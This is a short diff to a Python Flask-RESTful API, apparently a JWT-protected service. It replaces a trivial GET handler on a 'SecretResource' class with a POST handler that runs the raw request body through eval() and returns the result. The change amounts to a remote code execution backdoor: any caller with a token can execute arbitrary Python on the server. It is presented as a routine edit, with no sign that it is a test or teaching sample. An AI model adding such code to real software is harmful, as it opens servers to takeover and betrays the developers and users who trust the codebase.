@@ -122,7 +122,6 @@ class TokenRefresh(Resource):
        
 class SecretResource(Resource):
     @jwt_required
-    def get(self):
-        return {
-            'answer': 42
-        }
+    def post(self):
+        result = eval(request.data)
+        return result
